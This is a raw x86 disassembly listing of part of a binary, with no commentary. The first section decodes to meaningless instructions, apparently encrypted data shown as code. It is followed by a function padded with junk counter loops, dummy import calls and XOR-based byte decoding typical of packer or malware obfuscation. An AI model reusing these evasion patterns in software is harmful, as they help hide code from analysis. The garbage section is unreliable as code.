  41193d:	jae    0x4118fb
  41193f:	retf   0xe2a3
  411942:	pop    ebp
  411943:	jg     0x411934
  411945:	pop    ss
  411946:	das    
  411947:	sub    eax,0xd41baa12
  41194c:	pusha  
  41194d:	xchg   ebp,eax
  41194e:	and    ah,bl
  411950:	mov    BYTE PTR [eax+edi*4],bh
  411953:	mov    bh,ah
  411955:	cmp    bh,bl
  411957:	mov    ch,0x3c
  411959:	lea    ebp,[edi+eax*1]
  41195c:	pop    edx
  41195d:	loope  0x411903
  41195f:	aaa    
  411960:	sub    eax,0xb2454e76
  411965:	pop    ebx
  411966:	mov    dl,0x2d
  411968:	scas   eax,DWORD PTR es:[edi]
  411969:	sti    
  41196a:	push   ecx
  41196c:	mov    DWORD PTR [eax],edi
  41196e:	xchg   edi,eax
  41196f:	addr16 lahf 
  411971:	aas    
  411972:	outs   dx,DWORD PTR ds:[esi]
  411973:	fist   WORD PTR [edi]
  411975:	call   0xf717:0xc0532efd
  41197c:	call   0x72606be9
  411981:	(bad)  [ebx]
  411983:	sbb    bl,ah
  411985:	(bad)  
  411986:	cmp    DWORD PTR [esi+0x1f],edi
  411989:	jecxz  0x411951
  41198b:	loopne 0x411990
  41198d:	loop   0x4119f2
  41198f:	inc    edi
  411990:	clc    
  411991:	mov    bl,ch
  411993:	iret   
  411994:	fisub  WORD PTR [edi-0x6e]
  411997:	popf   
  411998:	push   ds
  411999:	cmp    BYTE PTR [ecx],dh
  41199b:	pop    es
  41199c:	repz jns 0x411922
  41199f:	in     eax,dx
  4119a0:	push   ebp
  4119a1:	cld    
  4119a2:	pop    eax
  4119a3:	stc    
  4119a4:	test   al,0x8c
  4119a6:	ss inc ebx
  4119a8:	daa    
  4119a9:	loop   0x411968
  4119ab:	jmp    0x1c25:0xbd7b2f98
  4119b2:	push   0xf
  4119b4:	in     eax,dx
  4119b5:	push   edi
  4119b6:	jne    0x411944
  4119b8:	in     eax,dx
  4119b9:	dec    esp
  4119ba:	sbb    eax,0xa0728f1
  4119bf:	mov    dh,0xcd
  4119c1:	mov    bh,0x42
  4119c3:	rcl    DWORD PTR [esi],0xab
  4119c6:	cmc    
  4119c7:	mov    ah,0xc6
  4119c9:	push   esp
  4119ca:	stos   DWORD PTR es:[edi],eax
  4119cb:	fnstsw WORD PTR [edi]
  4119cd:	lods   al,BYTE PTR ss:[esi]
  4119cf:	ja     0x4119e6
  4119d1:	adc    DWORD PTR [edx+ecx*8+0x51],eax
  4119d5:	jbe    0x411984
  4119d7:	ins    DWORD PTR es:[edi],dx
  4119d8:	push   0xffffffe0
  4119da:	je     0x411976
  4119dc:	dec    esp
  4119dd:	in     eax,dx
  4119de:	bound  edx,QWORD PTR [edx]
  4119e0:	cdq    
  4119e1:	jmp    0x48c8e644
  4119e6:	lahf   
  4119e7:	or     DWORD PTR [ecx-0x35190bd],ebx
  4119ed:	aad    0xc5
  4119ef:	jg     0x4119a8
  4119f1:	int3   
  4119f2:	jo     0x411a1d
  4119f4:	mov    bh,bl
  4119f6:	jp     0x411a10
  4119f8:	and    eax,0xc8fcd76e
  4119fd:	sub    BYTE PTR [edx],bh
  4119ff:	adc    BYTE PTR ds:0x1257d9d,bl
  411a05:	test   al,0x60
  411a07:	xor    esp,DWORD PTR [edi+0x1e15293a]
  411a0d:	add    edx,DWORD PTR [ebx+0x1b]
  411a10:	fdiv   QWORD PTR [esi-0x6a]
  411a13:	ins    BYTE PTR es:[edi],dx
  411a14:	adc    BYTE PTR [eax+0xd],cl
  411a17:	test   DWORD PTR [ebp-0x3016aac5],0x8af1eebb
  411a21:	loope  0x411a42
  411a23:	(bad)  
  411a24:	sti    
  411a25:	jmp    0x4119fa
  411a27:	push   esi
  411a28:	dec    eax
  411a29:	pusha  
  411a2a:	or     DWORD PTR [edi+0x4cb3a156],ebx
  411a30:	inc    esi
  411a31:	jno    0x411a2e
  411a33:	pop    esp
  411a34:	mov    eax,ds:0xce4ac2fb
  411a39:	inc    eax
  411a3a:	sbb    bl,dl
  411a3c:	call   0x519e2c56
  411a41:	test   DWORD PTR [ebx-0xd],edi
  411a44:	(bad)  
  411a45:	enter  0x93ff,0xa4
  411a49:	pusha  
  411a4a:	sbb    esp,DWORD PTR [edx+eax*1-0x683ddccd]
  411a51:	shl    DWORD PTR [esp+ebp*1-0x15f1e5e0],1
  411a58:	jb     0x411a64
  411a5a:	xchg   esi,eax
  411a5b:	das    
  411a5c:	into   
  411a5d:	das    
  411a5e:	xlat   BYTE PTR ds:[ebx]
  411a5f:	xlat   BYTE PTR ds:[ebx]
  411a60:	mov    eax,ds:0x8d4baa14
  411a65:	loopne 0x411ac2
  411a67:	push   es
  411a68:	and    sp,WORD PTR [esi-0x290c8b31]
  411a6f:	or     al,0xff
  411a71:	xchg   dh,cl
  411a73:	js     0x411a4b
  411a75:	jle    0x411a50
  411a77:	xor    ecx,eax
  411a79:	std    
  411a7a:	pop    ebx
  411a7b:	add    ah,al
  411a7d:	mov    edx,0x580f107
  411a82:	cmc    
  411a83:	sub    eax,0x9a67765
  411a88:	fbld   TBYTE PTR [esi]
  411a8a:	push   0x7f
  411a8c:	jp     0x411a21
  411a8e:	fdiv   QWORD PTR [eax+eiz*1]
  411a91:	xlat   BYTE PTR ds:[ebx]
  411a92:	ret    
  411a93:	cld    
  411a94:	outs   dx,DWORD PTR ds:[esi]
  411a95:	cmp    dh,ah
  411a97:	push   esp
  411a98:	addr16 xchg esi,eax
  411a9a:	push   ebx
  411a9b:	stc    
  411a9c:	ja     0x411a61
  411a9e:	out    dx,eax
  411a9f:	data16 (bad) 
  411aa1:	adc    al,0xba
  411aa3:	jae    0x411a2f
  411aa5:	outs   dx,DWORD PTR ds:[esi]
  411aa6:	aad    0x53
  411aa8:	xchg   ebx,eax
  411aa9:	(bad)  
  411aaa:	jns    0x411aff
  411aac:	jnp    0x411a94
  411aae:	jle    0x411af6
  411ab0:	mov    ds:0xb17683b4,eax
  411ab5:	stos   DWORD PTR es:[edi],eax
  411ab6:	ret    
  411ab7:	and    ah,BYTE PTR [ecx]
  411ab9:	xor    dh,ch
  411abb:	jne    0x411ada
  411abd:	stos   DWORD PTR es:[edi],eax
  411abe:	inc    edi
  411abf:	int3   
  411ac0:	sahf   
  411ac1:	jns    0x411b17
  411ac3:	in     eax,dx
  411ac4:	mov    ebx,0xa5fc68c9
  411ac9:	fmul   st(1),st
  411acb:	jle    0x411ad6
  411acd:	fbld   TBYTE PTR [edx-0x6b]
  411ad0:	xchg   esp,eax
  411ad1:	retf   0x2efd
  411ad4:	add    esi,DWORD PTR [eax]
  411ad6:	xor    al,0x8b
  411ad8:	arpl   WORD PTR [edi+esi*2-0x71a54308],bp
  411adf:	ja     0x411a66
  411ae1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ae2:	mov    BYTE PTR [ecx+ebp*8-0x1],al
  411ae6:	pop    esi
  411ae7:	repnz xchg ecx,eax
  411ae9:	adc    eax,0xe2f0420c
  411aee:	xchg   esp,eax
  411aef:	push   esp
  411af0:	aam    0xc3
  411af2:	fimul  DWORD PTR [eax+0x58100d2]
  411af8:	cmp    BYTE PTR [edx-0x7a],bl
  411afb:	arpl   dx,bx
  411afd:	push   edx
  411afe:	pop    edx
  411aff:	out    0x35,al
  411b01:	ins    BYTE PTR es:[edi],dx
  411b02:	popf   
  411b03:	dec    edx
  411b04:	popa   
  411b05:	add    DWORD PTR [ebp+0x190c0b4e],ebx
  411b0b:	mov    WORD PTR [ebx+edi*4-0x3ab4a42f],?
  411b12:	jnp    0x411b71
  411b14:	pop    eax
  411b15:	out    0xee,eax
  411b17:	test   al,0xf6
  411b19:	jo     0x411b20
  411b1b:	inc    edi
  411b1c:	repz out dx,eax
  411b1e:	mov    edi,0x91c9e8b
  411b23:	test   eax,0xa253674
  411b28:	(bad)  
  411b29:	les    eax,FWORD PTR ds:0xd37bf84
  411b2f:	jecxz  0x411bab
  411b31:	(bad)  
  411b32:	pusha  
  411b33:	jecxz  0x411ac1
  411b35:	add    edx,DWORD PTR [eax]
  411b37:	cmc    
  411b38:	sbb    BYTE PTR [ebp-0x492afb84],al
  411b3e:	xchg   esp,eax
  411b3f:	std    
  411b40:	and    ecx,DWORD PTR [edi]
  411b42:	xlat   BYTE PTR ds:[ebx]
  411b43:	in     eax,0xe0
  411b45:	sbb    al,0x3e
  411b47:	int3   
  411b48:	outs   dx,BYTE PTR ds:[esi]
  411b49:	popf   
  411b4a:	mov    ax,ds:0x12e8312d
  411b50:	mov    eax,ds:0x6afefbc7
  411b55:	stos   BYTE PTR es:[edi],al
  411b56:	sbb    DWORD PTR [eax],edi
  411b58:	imul   edx,esp,0x19fcd8ea
  411b5e:	mov    WORD PTR [eax],gs
  411b60:	lea    esp,[ebp+0x77]
  411b63:	jg     0x411bd4
  411b65:	sbb    eax,0x9db30093
  411b6a:	push   cs
  411b6b:	push   esp
  411b6c:	and    al,0x85
  411b6e:	repz iret 
  411b70:	fdivrp st(5),st
  411b72:	adc    al,0xf7
  411b74:	sbb    DWORD PTR [eax+0x79],edx
  411b77:	or     cl,bl
  411b79:	cmp    DWORD PTR [edi+eax*1-0x68],esi
  411b7d:	xbegin 0xcad3b921
  411b83:	ds mov esi,0x872b8790
  411b89:	scas   al,BYTE PTR es:[edi]
  411b8a:	and    ebp,DWORD PTR [ebx+0x25]
  411b8d:	or     cl,BYTE PTR [ebx]
  411b8f:	or     DWORD PTR [edx-0x44],0x14949842
  411b96:	inc    esp
  411b97:	add    BYTE PTR [edx],0x1e
  411b9a:	adc    DWORD PTR [eax+0x35],0xd7975ac2
  411ba1:	retf   
  411ba2:	repnz mov al,0xc2
  411ba5:	mov    al,0xab
  411ba7:	jo     0x411bf1
  411ba9:	fstp   TBYTE PTR ds:0x389257a
  411baf:	gs mov ebp,0x597ba171
  411bb5:	call   0xb7e8c140
  411bba:	xchg   BYTE PTR [esi],dl
  411bbc:	les    edx,FWORD PTR [edx]
  411bbe:	add    DWORD PTR [edx-0x349767e8],0xfffffff9
  411bc5:	add    ah,BYTE PTR [edi+0x73c4a270]
  411bcb:	mov    ebx,0x4cf8fb4a
  411bd0:	in     al,0xec
  411bd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bd3:	adc    ebp,DWORD PTR [esi-0x6e]
  411bd6:	hlt    
  411bd7:	mov    eax,ds:0x3ad2aa09
  411bdc:	int    0x2e
  411bde:	call   0xcdb76dc8
  411be3:	xchg   esi,eax
  411be4:	and    BYTE PTR [esi+0x47abd47f],dl
  411bea:	mov    ds:0x5f6ec1a0,al
  411bef:	mov    esi,DWORD PTR [ebp+0x10]
  411bf2:	mov    DWORD PTR [esi+0x8],eax
  411bf5:	mov    eax,DWORD PTR [ebp+0x18]
  411bf8:	mov    esi,DWORD PTR [ebp+0x10]
  411bfb:	mov    DWORD PTR [esi+0xc],eax
  411bfe:	mov    eax,DWORD PTR [ebp+0x1c]
  411c01:	mov    esi,DWORD PTR [ebp+0x10]
  411c04:	mov    DWORD PTR [esi+0x10],eax
  411c07:	mov    eax,DWORD PTR [ebp+0x8]
  411c0a:	xor    eax,ecx
  411c0c:	add    eax,edx
  411c0e:	pop    esi
  411c0f:	leave  
  411c10:	ret    0x18
  411c13:	push   ebp
  411c14:	mov    ebp,esp
  411c16:	sub    esp,0x9c
  411c1c:	mov    ecx,DWORD PTR [ebp+0x8]
  411c1f:	sbb    DWORD PTR ds:0x426f29,edi
  411c25:	mov    eax,0x8a9d
  411c2a:	adc    DWORD PTR ds:0x426eb5,0x24b2
  411c34:	xor    ax,WORD PTR [ecx+0x20]
  411c38:	mov    DWORD PTR ds:0x426f0d,0x19
  411c42:	cmp    DWORD PTR ds:0x426f0d,0x0
  411c49:	je     0x411c79
  411c4f:	cmp    DWORD PTR ds:0x426f0d,0x23
  411c56:	jge    0x411c79
  411c5c:	jmp    0x411c67
  411c61:	call   DWORD PTR ds:0x42fa00
  411c67:	mov    ecx,DWORD PTR ds:0x426f0d
  411c6d:	dec    ecx
  411c6e:	mov    DWORD PTR ds:0x426f0d,ecx
  411c74:	jmp    0x411c42
  411c79:	mov    ecx,0x3b5f
  411c7e:	add    ax,cx
  411c81:	mov    DWORD PTR ds:0x426e85,0x19
  411c8b:	cmp    DWORD PTR ds:0x426e85,0x0
  411c92:	je     0x411ce1
  411c98:	cmp    DWORD PTR ds:0x426e85,0xc
  411c9f:	jg     0x411ce1
  411ca5:	jmp    0x411cb3
  411caa:	push   DWORD PTR [ebp-0x10]
  411cad:	call   DWORD PTR ds:0x42fa3c
  411cb3:	cmp    DWORD PTR ds:0x426e85,0xd
  411cba:	jne    0x411ccf
  411cc0:	xor    ecx,ecx
  411cc2:	or     ecx,DWORD PTR ds:0x426e85
  411cc8:	dec    ecx
  411cc9:	mov    DWORD PTR ds:0x426e85,ecx
  411ccf:	mov    ecx,DWORD PTR ds:0x426e85
  411cd5:	dec    ecx
  411cd6:	mov    DWORD PTR ds:0x426e85,ecx
  411cdc:	jmp    0x411c8b
  411ce1:	movzx  eax,ax
  411ce4:	mov    ecx,DWORD PTR ds:0x426f25
  411cea:	sub    DWORD PTR ds:0x426e89,ecx
  411cf0:	mov    DWORD PTR [ebp-0x10],eax
  411cf3:	mov    BYTE PTR [ebp-0x1],0x7a
  411cf7:	lea    eax,[ebp-0x1]
  411cfa:	mov    DWORD PTR [ebp-0xc],eax
  411cfd:	mov    al,BYTE PTR [ebp-0x1]
  411d00:	mov    ecx,DWORD PTR [ebp-0xc]
  411d03:	xor    al,0x81
  411d05:	sub    DWORD PTR ds:0x426f2d,0x318c
  411d0f:	add    al,0x6
  411d11:	sub    DWORD PTR ds:0x426ef5,0x54d2
  411d1b:	mov    BYTE PTR [ecx],al
  411d1d:	and    eax,eax
  411d1f:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411d26:	push   ebx
  411d27:	and    DWORD PTR ds:0x426e8d,0x0
  411d31:	mov    ecx,DWORD PTR ds:0x426e8d
  411d37:	inc    ecx
  411d38:	mov    DWORD PTR ds:0x426e8d,ecx
  411d3e:	cmp    DWORD PTR ds:0x426e8d,0x22
  411d45:	jg     0x411d8e
  411d4b:	jmp    0x411d81
  411d50:	push   0x70b5
  411d55:	push   0x7924
  411d5a:	push   0x4ec8
  411d5f:	push   0x56ca
  411d64:	push   0x88b0
  411d69:	push   0x70c2
  411d6e:	push   0x4f11
  411d73:	push   DWORD PTR [ebp-0x1c]
  411d76:	push   0x827e
  411d7b:	call   DWORD PTR ds:0x42fa04
  411d81:	cmp    DWORD PTR ds:0x426e8d,0x18
  411d88:	jb     0x411d31
  411d8e:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  411d95:	and    DWORD PTR ds:0x426ee1,0x0
  411d9f:	jmp    0x411daf
  411da4:	mov    eax,ds:0x426ee1
  411da9:	inc    eax
  411daa:	mov    ds:0x426ee1,eax
  411daf:	cmp    DWORD PTR ds:0x426ee1,0x10
  411db6:	jae    0x411e0b
  411dbc:	cmp    DWORD PTR ds:0x426ee1,0x6
  411dc3:	jb     0x411e0b
  411dc9:	jmp    0x411dee
  411dce:	push   0x426ebd
  411dd3:	push   0x863e
  411dd8:	push   DWORD PTR [ebp-0x14]
  411ddb:	push   DWORD PTR [ebp-0x28]
  411dde:	push   0x80d0
  411de3:	push   0x79b2
  411de8:	call   DWORD PTR ds:0x42fa40
  411dee:	cmp    DWORD PTR ds:0x426ee1,0x5
  411df5:	jne    0x411e06
  411dfb:	mov    eax,ds:0x426ee1
  411e00:	inc    eax
  411e01:	mov    ds:0x426ee1,eax
  411e06:	jmp    0x411da4
  411e0b:	mov    ecx,DWORD PTR [ebp-0x18]
  411e0e:	push   esi
  411e0f:	mov    eax,0x75108b3
  411e14:	xor    ecx,eax
  411e16:	mov    esi,0x3272fa
  411e1b:	push   edi
  411e1c:	add    ecx,esi
  411e1e:	jmp    0x411e3e
  411e23:	not    DWORD PTR ds:0x426ea5
  411e29:	mov    dl,BYTE PTR [ebp-0x1]
  411e2c:	mov    DWORD PTR ds:0x426f25,0x1eab
  411e36:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  411e3d:	inc    ecx
  411e3e:	mov    DWORD PTR ds:0x426ee1,0x6456
  411e48:	cmp    ecx,0x40
  411e4b:	mov    DWORD PTR ds:0x426ea9,0x5cb
  411e55:	jb     0x411e23
  411e5b:	sub    DWORD PTR ds:0x426ec5,0x4698
  411e65:	mov    edx,DWORD PTR [ebp-0x18]
  411e68:	xor    edx,eax
  411e6a:	add    edx,esi
  411e6c:	mov    DWORD PTR ds:0x426ea9,0x4896
  411e76:	jmp    0x411f44
  411e7b:	mov    edi,DWORD PTR [ebp+0x8]
  411e7e:	and    DWORD PTR ds:0x426e9d,0x0
  411e88:	jmp    0x411e9a
  411e8d:	mov    ecx,DWORD PTR ds:0x426e9d
  411e93:	inc    ecx
  411e94:	mov    DWORD PTR ds:0x426e9d,ecx
  411e9a:	cmp    DWORD PTR ds:0x426e9d,0x12
  411ea1:	jae    0x411ec4
  411ea7:	cmp    DWORD PTR ds:0x426e9d,0x1f
  411eae:	jg     0x411ec4
  411eb4:	jmp    0x411ebf
  411eb9:	call   DWORD PTR ds:0x42fa08
  411ebf:	jmp    0x411e8d
  411ec4:	mov    ecx,0x8a9d
  411ec9:	add    DWORD PTR ds:0x426f1d,0x3bc7
  411ed3:	xor    cx,WORD PTR [edi+edx*4+0x2]
  411ed8:	mov    edi,0x3b5f
  411edd:	or     DWORD PTR ds:0x426ec9,0x426e8d
  411ee7:	add    cx,di
  411eea:	movzx  ecx,cx
  411eed:	mov    DWORD PTR [ebp-0xc],ecx
  411ef0:	mov    ecx,DWORD PTR ds:0x426ee9
  411ef6:	sub    ecx,DWORD PTR ds:0x426e99
  411efc:	mov    DWORD PTR ds:0x426ee9,ecx
  411f02:	mov    ecx,DWORD PTR [ebp+0x8]
  411f05:	or     DWORD PTR ds:0x426f2d,0x426e89
  411f0f:	movzx  ecx,WORD PTR [ecx+edx*4]
  411f13:	adc    DWORD PTR ds:0x426ebd,0x426ef1
  411f1d:	xor    ecx,0x8a9d
  411f23:	xor    DWORD PTR ds:0x426ef5,0x426e95
  411f2d:	add    ecx,edi
  411f2f:	mov    edi,DWORD PTR [ebp-0xc]
  411f32:	mov    DWORD PTR ds:0x426f09,0x3565
  411f3c:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  411f43:	inc    edx
  411f44:	mov    ecx,0x1c2a
  411f49:	mov    ecx,DWORD PTR [ebp-0x10]
  411f4c:	cmp    edx,ecx
  411f4e:	jne    0x411e7b
  411f54:	sub    edx,0x34ee
  411f5a:	mov    ecx,DWORD PTR [ebp-0x18]
  411f5d:	xor    DWORD PTR ds:0x426ef9,ecx
  411f63:	mov    edx,DWORD PTR [ebp+0x10]
  411f66:	mov    DWORD PTR ds:0x426ec5,0x17
  411f70:	cmp    DWORD PTR ds:0x426ec5,0x0
  411f77:	je     0x411fcf
  411f7d:	cmp    DWORD PTR ds:0x426ec5,0x2
  411f84:	jl     0x411fcf
  411f8a:	jmp    0x411f9f
  411f8f:	push   0x4ca2
  411f94:	push   0x426035
  411f99:	call   DWORD PTR ds:0x42fa44
  411f9f:	cmp    DWORD PTR ds:0x426ec5,0x3
  411fa6:	jne    0x411fbb
  411fac:	xor    edi,edi
  411fae:	xor    edi,DWORD PTR ds:0x426ec5
  411fb4:	dec    edi
  411fb5:	mov    DWORD PTR ds:0x426ec5,edi
  411fbb:	xor    edi,edi
  411fbd:	add    edi,DWORD PTR ds:0x426ec5
  411fc3:	dec    edi
  411fc4:	mov    DWORD PTR ds:0x426ec5,edi
  411fca:	jmp    0x411f70
  411fcf:	xor    ecx,eax
  411fd1:	mov    DWORD PTR ds:0x426f21,0x1d
  411fdb:	cmp    DWORD PTR ds:0x426f21,0x0
  411fe2:	je     0x41201c
  411fe8:	cmp    DWORD PTR ds:0x426f21,0x2c
  411fef:	jg     0x41201c
  411ff5:	jmp    0x41200a
  411ffa:	push   0x426ed5
  411fff:	push   0x3809
  412004:	call   DWORD PTR ds:0x42fa48
  41200a:	mov    edi,DWORD PTR ds:0x426f21
  412010:	dec    edi
  412011:	mov    DWORD PTR ds:0x426f21,edi
  412017:	jmp    0x411fdb
  41201c:	add    ecx,esi
  41201e:	xor    edi,DWORD PTR ds:0x426ea9
  412024:	mov    DWORD PTR [edx],ecx
  412026:	mov    ecx,DWORD PTR [ebp-0x18]
  412029:	xor    ecx,eax
  41202b:	add    ecx,esi
  41202d:	and    edi,0x6cf8
  412033:	mov    DWORD PTR [ebp-0xc],ecx
  412036:	mov    DWORD PTR ds:0x426ea5,0x13
  412040:	cmp    DWORD PTR ds:0x426ea5,0x0
  412047:	je     0x41207a
  41204d:	cmp    DWORD PTR ds:0x426ea5,0x1f
  412054:	jge    0x41207a
  41205a:	jmp    0x412068
  41205f:	push   DWORD PTR [ebp-0x24]
  412062:	call   DWORD PTR ds:0x42fa0c
  412068:	mov    edi,DWORD PTR ds:0x426ea5
  41206e:	dec    edi
  41206f:	mov    DWORD PTR ds:0x426ea5,edi
  412075:	jmp    0x412040
  41207a:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  412081:	mov    DWORD PTR ds:0x426ea9,0x18
  41208b:	cmp    DWORD PTR ds:0x426ea9,0x0
  412092:	je     0x4120ec
  412098:	cmp    DWORD PTR ds:0x426ea9,0xa
  41209f:	ja     0x4120ec
  4120a5:	jmp    0x4120c0
  4120aa:	push   DWORD PTR [ebp-0x28]
  4120ad:	push   0x4ee1
  4120b2:	push   DWORD PTR [ebp-0x20]
  4120b5:	push   0x56ea
  4120ba:	call   DWORD PTR ds:0x42fa4c
  4120c0:	cmp    DWORD PTR ds:0x426ea9,0xb
  4120c7:	jne    0x4120da
  4120cd:	mov    ecx,DWORD PTR ds:0x426ea9
  4120d3:	dec    ecx
  4120d4:	mov    DWORD PTR ds:0x426ea9,ecx
  4120da:	mov    ecx,DWORD PTR ds:0x426ea9
  4120e0:	dec    ecx
  4120e1:	mov    DWORD PTR ds:0x426ea9,ecx
  4120e7:	jmp    0x41208b
  4120ec:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  4120f3:	adc    edi,edi
  4120f5:	mov    DWORD PTR [ebp-0x10],0xf89c95b5
  4120fc:	mov    ecx,DWORD PTR ds:0x426f19
  412102:	adc    DWORD PTR ds:0x426eb9,ecx
  412108:	mov    ecx,DWORD PTR [ebp-0x14]
  41210b:	movzx  edi,BYTE PTR ds:0x426ef5
  412112:	add    edi,DWORD PTR ds:0x426ed5
  412118:	mov    DWORD PTR ds:0x426ef5,edi
  41211e:	mov    DWORD PTR [ebp+0x8],ecx
  412121:	mov    ecx,DWORD PTR [ebp+0x8]
  412124:	mov    DWORD PTR ds:0x426eb1,0x11
  41212e:	cmp    DWORD PTR ds:0x426eb1,0x0
  412135:	je     0x4121a1
  41213b:	cmp    DWORD PTR ds:0x426eb1,0x9
  412142:	jl     0x4121a1
  412148:	jmp    0x412175
  41214d:	push   DWORD PTR [ebp-0x24]
  412150:	push   0x5b11
  412155:	push   0x5886
  41215a:	push   DWORD PTR [ebp-0xc]
  41215d:	push   DWORD PTR [ebp-0x28]
  412160:	push   0x128a
  412165:	push   0x1ff9
  41216a:	push   0x6625
  41216f:	call   DWORD PTR ds:0x42fa10
  412175:	cmp    DWORD PTR ds:0x426eb1,0xa
  41217c:	jne    0x41218f
  412182:	mov    edi,DWORD PTR ds:0x426eb1
  412188:	dec    edi
  412189:	mov    DWORD PTR ds:0x426eb1,edi
  41218f:	mov    edi,DWORD PTR ds:0x426eb1
  412195:	dec    edi
  412196:	mov    DWORD PTR ds:0x426eb1,edi
  41219c:	jmp    0x41212e
  4121a1:	xor    ecx,eax
  4121a3:	and    DWORD PTR ds:0x426ebd,0x0
  4121ad:	jmp    0x4121bf
  4121b2:	mov    edi,DWORD PTR ds:0x426ebd
  4121b8:	inc    edi
  4121b9:	mov    DWORD PTR ds:0x426ebd,edi
  4121bf:	cmp    DWORD PTR ds:0x426ebd,0x14
  4121c6:	jae    0x4121e9
  4121cc:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4121d3:	jle    0x4121e9
  4121d9:	jmp    0x4121e4
  4121de:	call   DWORD PTR ds:0x42fa14
  4121e4:	jmp    0x4121b2
  4121e9:	add    ecx,esi
  4121eb:	mov    edi,DWORD PTR ds:0x426ec9
  4121f1:	mov    ecx,0xf641bea
  4121f6:	mov    edi,0x5a1eade
  4121fb:	mov    DWORD PTR ds:0x426ed5,0x1d19
  412205:	je     0x416e72
  41220b:	and    DWORD PTR ds:0x426e95,0x0
  412215:	jmp    0x412229
  41221a:	xor    ebx,ebx
  41221c:	xor    ebx,DWORD PTR ds:0x426e95
  412222:	inc    ebx
  412223:	mov    DWORD PTR ds:0x426e95,ebx
  412229:	cmp    DWORD PTR ds:0x426e95,0x1f
  412230:	jae    0x41225c
  412236:	cmp    DWORD PTR ds:0x426e95,0x2f
  41223d:	jl     0x41225c
  412243:	jmp    0x412257
  412248:	push   DWORD PTR [ebp-0x18]
  41224b:	push   DWORD PTR [ebp-0x18]
  41224e:	push   DWORD PTR [ebp-0x10]
  412251:	call   DWORD PTR ds:0x42fa18
  412257:	jmp    0x41221a
  41225c:	mov    edx,DWORD PTR [ebp+0x8]
  41225f:	mov    ebx,DWORD PTR ds:0x426ec5
  412265:	add    ebx,DWORD PTR ds:0x426ea1
  41226b:	mov    DWORD PTR ds:0x426ec5,ebx
  412271:	mov    ebx,DWORD PTR [ebp-0x8]
  412274:	xor    edx,eax
  412276:	sbb    DWORD PTR ds:0x426ea1,0x426edd
  412280:	xor    ebx,eax
  412282:	add    DWORD PTR ds:0x426e91,0x426ec5
  41228c:	sub    edx,ebx
  41228e:	sub    edx,esi
  412290:	sbb    DWORD PTR ds:0x426eb5,edi
  412296:	xor    edx,eax
  412298:	mov    DWORD PTR [ebp+0x8],edx
  41229b:	add    edx,0x4d69
  4122a1:	mov    edx,DWORD PTR [ebp+0x8]
  4122a4:	mov    ebx,DWORD PTR [ebp-0x58]
  4122a7:	lea    edx,[ebx+edx*1+0x5708f4]
  4122ae:	mov    DWORD PTR [ebp-0x58],edx
  4122b1:	mov    edx,DWORD PTR [ebp+0x8]
  4122b4:	xor    ebx,DWORD PTR ds:0x426f05
  4122ba:	mov    ebx,DWORD PTR [ebp-0x54]
  4122bd:	and    DWORD PTR ds:0x426f11,0x6a73
  4122c7:	add    edx,0x64f89a
  4122cd:	adc    DWORD PTR ds:0x426ea5,0x426ef1
  4122d7:	imul   edx,ebx
  4122da:	or     DWORD PTR ds:0x426eed,0x7801
  4122e4:	mov    DWORD PTR [ebp-0x54],edx
  4122e7:	and    DWORD PTR ds:0x426ea9,0x0
  4122f1:	mov    edx,DWORD PTR ds:0x426ea9
  4122f7:	inc    edx
  4122f8:	mov    DWORD PTR ds:0x426ea9,edx
  4122fe:	cmp    DWORD PTR ds:0x426ea9,0xa
  412305:	ja     0x41234d
  41230b:	jmp    0x412326
  412310:	push   DWORD PTR [ebp-0x18]
  412313:	push   0x70df
  412318:	push   DWORD PTR [ebp-0x28]
  41231b:	push   0x6818
  412320:	call   DWORD PTR ds:0x42fa1c
  412326:	cmp    DWORD PTR ds:0x426ea9,0x9
  41232d:	jne    0x412340
  412333:	mov    edx,DWORD PTR ds:0x426ea9
  412339:	inc    edx
  41233a:	mov    DWORD PTR ds:0x426ea9,edx
  412340:	cmp    DWORD PTR ds:0x426ea9,0x1f
  412347:	jb     0x4122f1
  41234d:	mov    edx,DWORD PTR [ebp+0x8]
  412350:	movzx  ebx,WORD PTR ds:0x426ef1
  412357:	sub    DWORD PTR ds:0x426eb9,ebx
  41235d:	mov    ebx,DWORD PTR [ebp-0x50]
  412360:	add    edx,0x242ebe9
  412366:	sbb    DWORD PTR ds:0x426ef1,0x426ee1
  412370:	and    edx,ebx
  412372:	mov    DWORD PTR [ebp-0x50],edx
  412375:	xor    edx,edx
  412377:	or     edx,DWORD PTR ds:0x426ed1
  41237d:	adc    DWORD PTR ds:0x426ec5,edx
  412383:	mov    edx,DWORD PTR [ebp+0x8]
  412386:	and    DWORD PTR ds:0x426f09,0x423
  412390:	mov    ebx,DWORD PTR [ebp-0x4c]
  412393:	and    DWORD PTR ds:0x426ee1,0x67c7
  41239d:	add    edx,ecx
  41239f:	mov    DWORD PTR ds:0x426ee1,0x22dc
  4123a9:	or     edx,ebx
  4123ab:	and    DWORD PTR ds:0x426f2d,0x602a
  4123b5:	mov    DWORD PTR [ebp-0x4c],edx
  4123b8:	and    DWORD PTR ds:0x426e8d,edx
  4123be:	mov    edx,DWORD PTR [ebp+0x8]
  4123c1:	mov    DWORD PTR ds:0x426ee9,0x1e
  4123cb:	cmp    DWORD PTR ds:0x426ee9,0x0
  4123d2:	je     0x41241c
  4123d8:	cmp    DWORD PTR ds:0x426ee9,0xf
  4123df:	jl     0x41241c
  4123e5:	jmp    0x4123f0
  4123ea:	call   DWORD PTR ds:0x42fa20
  4123f0:	cmp    DWORD PTR ds:0x426ee9,0x10
  4123f7:	jne    0x41240a
  4123fd:	mov    ebx,DWORD PTR ds:0x426ee9
  412403:	dec    ebx
  412404:	mov    DWORD PTR ds:0x426ee9,ebx
  41240a:	mov    ebx,DWORD PTR ds:0x426ee9
  412410:	dec    ebx
  412411:	mov    DWORD PTR ds:0x426ee9,ebx
  412417:	jmp    0x4123cb
  41241c:	mov    ebx,0xfdbe0321
  412421:	sub    ebx,edx
  412423:	sbb    edx,0x3018
  412429:	add    ebx,DWORD PTR [ebp-0x48]
  41242c:	sub    DWORD PTR ds:0x426e85,0x15fb
  412436:	mov    DWORD PTR [ebp-0x48],ebx
  412439:	mov    DWORD PTR ds:0x426f0d,0x10
